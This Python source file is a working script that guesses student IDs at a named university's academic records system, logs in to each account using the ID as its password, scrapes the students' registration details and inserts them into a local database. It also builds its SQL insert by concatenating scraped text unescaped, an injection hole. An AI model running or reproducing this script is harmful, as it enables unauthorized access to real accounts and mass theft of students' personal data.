# -*- coding: utf-8 -*-
"""
@author:JamesZBL
Created on:18-2-7 12:00
"""

import requests
import time
from lxml import etree
from URPScrapy import db_init

URL_LOGIN = 'http://lgjwxt.hebust.edu.cn/loginAction.do'
URL_LOGOUT = 'http://lgjwxt.hebust.edu.cn/logout.do?loginType=platformLogin'
URL_XJXX = 'http://lgjwxt.hebust.edu.cn/xjInfoAction.do?oper=xjxx'


def main():
	conn = db_init.connect_db()
	grade = 15
	seprater = 'L'
	college = ['01', '02', '03', '04', '05', '06', '07']
	sub = ['51', '52']
	sum = 0
	sumget = 0
	# 开始获取信息
	for c in college:
		for s in sub:
			pre = str(grade) + seprater + c + s
			for i in range(1, 300):
				username = pre + str(i).zfill(3)
				result = getinfo(username, username, conn)
				sum += 1
				if result != 2:
					sum += 1
					if result == 0:
						sumget += 1
				else:
					break
	# 完成
	conn.close()
	print('既定数据获取完成，尝试获取总数：{}，成功获取总数：{}'.format(sum, sumget))
	print("获取成功率为：%.2f%%" % ((sumget / sum) * 100))


def getinfo(zjh, mm, conn):
	# 请求参数
	param = {"zjh": zjh, "mm": mm}
	print('证件号: {}\n密  码: {}'.format(zjh, mm))
	#  获取 Session
	session = requests.session()
	# 发送登录请求
	req = session.get(URL_LOGIN, params=param)
	print('发送请求>>>{}'.format(req.url))
	res_text = req.text
	# 密码有误
	if res_text.__contains__('密码不正确'):
		print('密码不正确')
		session.close()
		return 1
	# 证件号无效
	if res_text.__contains__('你输入的证件号不存在，请您重新输入！'):
		print('证件号不存在')
		session.close()
		return 2
	print('登录成功')
	# 获取学籍信息
	reqXJXX = session.get(URL_XJXX)
	# 注销登录
	session.post(URL_LOGOUT)
	# 结束会话
	session.close()
	print('发送请求>>{}'.format(reqXJXX.url))
	# 获取相应内容
	text = reqXJXX.text
	selector = etree.HTML(text)
	textarr = selector.xpath('//td[starts-with(@width,"275")]/text()')
	result = []
	for info in textarr:
		result.append(info.strip())
	save_info(conn, result)
	return 0


def save_info(conn, info):
	sql_str = 'INSERT INTO urp_hebust_lg VALUES (NULL ,'
	for i in info:
		sql_str += "\'" + str(i) + "\'" + ','
	sql_str = sql_str[0:sql_str.__len__() - 1]
	sql_str += ")"
	print(sql_str)
	conn.cursor().execute(sql_str)
	conn.commit()


if __name__ == '__main__':
	main()
